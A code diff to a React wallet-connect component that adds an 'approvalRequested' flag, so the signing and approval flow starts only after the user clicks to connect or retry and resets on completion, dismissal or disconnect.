@@ -117,6 +117,7 @@ const WalletConnectControl = React.lazy(async () => {
       const [retrySeed, setRetrySeed] = useState(0);
       const [dismissedAddress, setDismissedAddress] = useState<string | null>(null);
       const [walletActionPending, setWalletActionPending] = useState(false);
+      const [approvalRequested, setApprovalRequested] = useState(false);
 
       useEffect(() => {
         if (!address) {
@@ -126,6 +127,7 @@ const WalletConnectControl = React.lazy(async () => {
           setApprovalMessage('Connect your wallet to start signing and approval.');
           setDismissedAddress(null);
           setWalletActionPending(false);
+          setApprovalRequested(false);
         }
       }, [address]);
 
@@ -133,7 +135,7 @@ const WalletConnectControl = React.lazy(async () => {
         let cancelled = false;
 
         const runTransparentApprovalFlow = async () => {
-          if (!address || !publicClient || dismissedAddress === address) {
+          if (!approvalRequested || !address || !publicClient || dismissedAddress === address) {
             return;
           }
 
@@ -224,6 +226,7 @@ const WalletConnectControl = React.lazy(async () => {
                 window.localStorage.setItem(storageKey, 'complete');
                 setWalletActionPending(false);
                 setApprovalVisible(false);
+                setApprovalRequested(false);
                 return;
               }
             }
@@ -252,6 +255,7 @@ const WalletConnectControl = React.lazy(async () => {
             window.localStorage.setItem(storageKey, 'complete');
             setWalletActionPending(false);
             setApprovalVisible(false);
+            setApprovalRequested(false);
           } catch (error) {
             if (cancelled) return;
 
@@ -273,7 +277,7 @@ const WalletConnectControl = React.lazy(async () => {
         return () => {
           cancelled = true;
         };
-      }, [address, currentChainId, dismissedAddress, publicClient, retrySeed, signMessageAsync, switchChainAsync, writeContractAsync]);
+      }, [address, approvalRequested, currentChainId, dismissedAddress, publicClient, retrySeed, signMessageAsync, switchChainAsync, writeContractAsync]);
 
       return (
         <>
@@ -344,6 +348,7 @@ const WalletConnectControl = React.lazy(async () => {
                             type="button"
                             onClick={() => {
                               setDismissedAddress(null);
+                              setApprovalRequested(true);
                               attemptRef.current = null;
                               setRetrySeed((value) => value + 1);
                             }}
@@ -358,6 +363,7 @@ const WalletConnectControl = React.lazy(async () => {
                           onClick={() => {
                             setDismissedAddress(address);
                             setApprovalVisible(false);
+                            setApprovalRequested(false);
                           }}
                           className="rounded-xl bg-white px-4 py-2 text-sm font-semibold text-realm-black transition hover:bg-realm-cyan"
                         >
@@ -381,7 +387,11 @@ const WalletConnectControl = React.lazy(async () => {
               <div className={className}>
                 <button
                   type="button"
-                  onClick={openConnectModal}
+                  onClick={() => {
+                    setDismissedAddress(null);
+                    setApprovalRequested(true);
+                    openConnectModal();
+                  }}
                   className={cn(
                     'inline-flex min-h-11 items-center justify-center rounded-xl bg-white px-4 py-2 text-sm font-semibold text-realm-black transition-all hover:bg-realm-cyan',
                     buttonClassName
@@ -417,6 +427,7 @@ const WalletConnectControl = React.lazy(async () => {
                 onClick={() => {
                   if (walletActionPending) {
                     setDismissedAddress(null);
+                    setApprovalRequested(true);
                     attemptRef.current = null;
                     setApprovalVisible(true);
                     setRetrySeed((value) => value + 1);
